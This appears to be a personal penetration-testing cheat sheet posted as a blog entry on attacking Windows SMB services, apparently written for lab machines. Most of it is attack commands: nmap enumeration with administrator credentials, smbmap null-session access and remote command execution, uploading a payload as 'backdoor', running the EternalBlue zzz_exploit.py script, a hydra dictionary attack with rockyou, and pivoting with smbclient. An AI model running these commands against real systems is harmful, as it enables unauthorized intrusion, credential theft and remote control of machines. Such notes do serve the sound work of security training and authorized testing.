---
title: 'SMB (Server Message Block)'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/ldapi.jpg'
tag: ['windows', 'smb']
---

## Information

- It's a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

- Uses port 445(TCP). SMB ran on top of NetBIOS using port 139.

- Samba is an open source Linux implementation of SMB, and alllows Windows systems to access Linux shres and devices

## Exploit

knowing creds.

```bash
psexec.py Administrator@target cmd.exe
```

### Windows Discover and mount

How to mount in powershell:

```bash
# Clear the stored session
net use * /delete

# Mount the target folder
net use Z: \\10.4.17.133\C$ smbserver_771 /user:administrator
```

### SMB Windows Recon: Nmap scripts

```bash
$nmap target
135/tcp   open    msrpc
139/tcp   open    netbios-ssn
445/tcp   open    microsoft-ds

# list the supported protocols and dialects of an SMB server
$nmap -p445 --script smb-protocols target
...

# information about the SMB security level.
$nmap -p445 --script smb-security-mode target
...(but defult usually makes good )
... acc

# with creds discover sensitive information
$nmap -p445 --script smb-enum-sessions target
...

# In case guest login is not enabled we can always use valid credentials of the target machine to discover the same information

$nmap -p445 --script smb-enum-sessions --script-args
...smbusername=administrator,smbpassword=smbserver_771 target

$nmap -p445 --script smb-enum-sessions target --script-args smbusername=administrator,smbpassword=smbserver_771 target
...

$nmap -p445 --script smb-enum-shares target
...

$nmap -p445 --script smb-enum-shares target --script-args
...smbusername=administrator,smbpassword=smbserver_771 target

$nmap smb-enum-users 'same as above'

$nmap smb-server-stats 'same as above'

$nmap smb-enum-domains 'same as above'

$nmap smb-enum-groups 'same as above'

$nmap smb-enum-services 'same as above'

# Enumerate folders and list them
$nmap smb-enum-shares,smb-ls 'same as above'

```

### smbmap Recon

```bash
# NULL SESSION - user, pass, directory, host
smbmap -u guest -p "" -d . -H target

# Remote code execution :D!
smbmap -u administrato -p "" -d . -H target -x 'ipconfig'

smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -L

# connect to C drive
smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -r 'C$'

# upload file
smbmap -u Administrator -p "smbserver_771" -H target -d --upload '/root/payload' 'C$\backdoor'

# download file
smbmap -u Administrator -p "smbserver_771" -H target --download 'C$\flag.txt'

```

### SMBClient - ftp-like client to access SMB/CIFS resources on servers.

Windows 7 y smb puede ser un Eternalblue.

-> AutoBlue-Ms17-010

1: eternal_checker.py target
2: proxychains python2.7 zzz_exploit.py target

```bash
$nmbloopup -A taget

$rpcclient -U "" -N target

# If we see IPC$ maybe null session works
$smbclient -L target -N

...-h
...enumerate

######################################
# Despues de montar podemos ver en ls -lsa /media/k_share
sudo mount.cifs //target/c /media/k_share user=,pass=

# Dictionary attack

hydra -l admin -P /usr/share/wordlist/rockyou.txt target smb

#if discover pass
smbmap -H target -u admin -p password1

# pivot
$smbclient -L target -U jane
or
$smbclient //target/jane -U jane

#other way to find users:
$enum4linux -r -u "admin" -p "password1" target

```

